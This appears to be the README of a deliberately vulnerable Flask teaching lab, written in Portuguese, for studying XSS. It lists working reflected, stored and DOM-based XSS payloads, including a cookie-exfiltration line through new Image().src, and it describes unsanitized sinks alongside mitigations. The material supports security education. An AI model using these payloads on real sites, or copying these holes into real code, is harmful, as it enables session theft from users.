# XSS Lab — Laboratório de Vulnerabilidades XSS

> ⚠️ **AVISO: Este sistema é INTENCIONALMENTE VULNERÁVEL.**
> Criado exclusivamente para fins acadêmicos e educacionais.
> **NÃO utilize em ambientes de produção ou em sistemas reais.**

---

## Instalação e execução

### Requisitos
- Python 3.8+
- pip

### Passos

```bash
# 1. Instale a dependência
pip install flask

# 2. Execute o servidor
python app.py

# 3. Acesse no navegador
http://localhost:5000
```

---

## Estrutura do projeto

```
xss-lab/
├── app.py                  # Backend Flask (vulnerável)
├── requirements.txt
├── xsslab.db               # SQLite (criado automaticamente)
├── static/
│   ├── css/style.css       # Estilo visual
│   └── js/
│       ├── main.js         # Utilitários gerais
│       ├── dom-xss.js      # Sinks DOM vulneráveis
│       └── cookie-demo.js  # Demo de roubo de cookie
└── README.md
```

---

## Vulnerabilidades demonstradas

### 1. Reflected XSS — `/reflected`
- Parâmetro `?q=` inserido direto no HTML via f-string Python
- Parâmetro `?name=` injetado dentro de atributo `value="..."`
- Parâmetro `?error=` refletido em mensagem de erro

**Payloads de exemplo:**
```
/reflected?q=<script>alert('XSS')</script>
/reflected?q=<img src=x onerror=alert(document.cookie)>
/reflected?name=" onmouseover="alert(1)" x="
/reflected?error=<svg onload=alert(1)>
```

---

### 2. Stored XSS — `/stored`
- Comentários salvos no SQLite sem sanitização
- Recuperados e renderizados com `innerHTML` implícito (f-string Python)
- Afeta **todos os visitantes** da página

**Payloads de exemplo:**
```html
<script>alert('Stored XSS!')</script>
<img src=x onerror="alert('Cookie: '+document.cookie)">
<svg/onload=alert(document.domain)>
<script>new Image().src='/cookie-demo?stolen='+document.cookie</script>
```

---

### 3. DOM-based XSS — `/dom`
- `location.hash` → `innerHTML` (sem sanitização)
- `location.search ?msg=` → `innerHTML`
- Input → `document.write()`
- Input → `eval()`

**Payloads de exemplo:**
```
/dom#<img src=x onerror=alert(1)>
/dom?msg=<svg/onload=alert(1)>
eval input: alert(document.cookie)
eval input: document.body.innerHTML='<h1>Hacked</h1>'
```

---

### 4. Cookie Theft — `/cookie-demo`
- Cookies definidos **sem flag `HttpOnly`** (legíveis via JS)
- Demonstração de `document.cookie`
- Simulação de exfiltração via `new Image().src`
- Keylogger de demonstração

---

## Mitigações (para estudo)

| Vulnerabilidade | Mitigação |
|-----------------|-----------|
| Reflected XSS | Escapar outputs com `html.escape()` ou Jinja2 auto-escaping |
| Stored XSS | Sanitizar inputs antes de salvar; escapar ao renderizar |
| DOM XSS | Evitar `innerHTML`, `document.write`, `eval`; usar `textContent` |
| Cookie Theft | Flag `HttpOnly=True` nos cookies; `SameSite=Strict` |
| Geral | Content Security Policy (CSP) |

---

## Aviso legal

O conhecimento sobre vulnerabilidades deve ser usado para **defender sistemas**.
Aplicar estas técnicas sem autorização é crime. Use apenas em ambientes controlados e com permissão.
